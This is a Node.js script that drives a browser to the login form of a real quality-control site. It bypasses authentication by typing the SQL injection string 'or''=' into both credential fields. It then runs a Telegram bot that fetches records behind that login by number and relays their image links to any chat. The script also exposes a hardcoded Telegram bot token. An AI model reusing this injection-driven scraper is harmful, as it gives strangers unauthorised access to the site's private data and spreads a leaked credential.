

const request = require('request');

const puppeteer = require("puppeteer");

const fetch = require("node-fetch");
/////Area coba coba

const http = require('http');

/////Area coba coba


(async () => {
    
const response = await fetch('https://github.com/');

const body = await response.text();

    const delay = ms => new Promise(resolve => setTimeout(resolve, ms))
function kirim_pesan(chat_id,text){
    
    request('https://api.telegram.org/bot6064787787:AAFrS21whMBWOvK0KTVEdte_DQkDxl_lDj0/sendMessage?parse_mode=HTML&chat_id='+ chat_id +'&text=' + encodeURIComponent(text), { json: true }, (err, res, body) => {
  if (err) { return console.log(err); }
 
});
}
    var last_msg = "0";
    const browser = await puppeteer.launch({ headless: false, args: [ '--ignore-certificate-errors' ]});
    const page = await browser.newPage();
/////WEB LINK
    await page.goto("http://qcborneo.id/qc/?inet=");
    
/////LOGIN
   await page.waitForSelector("#nik");
    await page.type("#nik", "'or''='", { delay: 100});
    await page.type("#pass", "'or''='", { delay: 100});
    await page.click("button");
    
   

   
   

   


/////TEST
while(true){
    console.log("Looping ke- \n");
    await delay(2000)

    const responsenya = await fetch('https://api.telegram.org/bot6064787787:AAFrS21whMBWOvK0KTVEdte_DQkDxl_lDj0/getUpdates?offset='+last_msg);
    
    const response = await responsenya.json();
console.log(response);
      
        //    console.log(body);
        var result = response.result;
        var wasu = response.result.slice(-1)[0];
    
        
      
        
        
        result.forEach(async function(table) {
            if (last_msg === table.update_id){
    
            }
            else{
                
    
    
    
        //ATUR ATUR

console.log(table);
            var text = table.message.text;
            //var text = "";
            var chtid = table.message.chat.id;
            //var  chtid = "";
           console.log("sukses");
          console.log(text) ;
            console.log(chtid);
            console.log("\n\n\n") ;
    
    
            
    
                if (text === "/start"){
                    kirim_pesan(chtid,"Masukkan Nomor Inet");
                }
                else if (text === "/menu"){
                    kirim_pesan(chtid,"Menu, Maaf dalam pengembangan");
                }
                else if (text.startsWith("/foto ")){
                    
                    var val_inet = text.replace("/foto ","");
                   
                    
                    await page.goto("http://qcborneo.id/qc/?inet=" + val_inet, {delay: 100});
                    const inner_html = await page.evaluate(() => document.querySelector('.p-5').innerHTML);
                    var inner_html2 = inner_html.replace(/"/g, "");
                    var inner_html3 = inner_html2.replace(/>/g, "");

                    

                    var matches = inner_html3.match(/\bhttps?:\/\/\S+/gi);

                    var cokok = [];
                    
                    
                    for (let cokcok of matches) {
                        cokok.push("<a href='"+cokcok+"'>Gambar cok\n</a>"  );
                    }
                    
                    var text = cokok.join("\n");
                    



                    console.log(text);
                    kirim_pesan(chtid,text);
    
                }
                else{
                    kirim_pesan(chtid,"Tolong masukkan Inet Dengan benar!");
                }
    
    
    
        //ATUR ATUR
            }
            
    
            
    
        });
    
        last_msg = wasu.update_id;
        
    


}





})();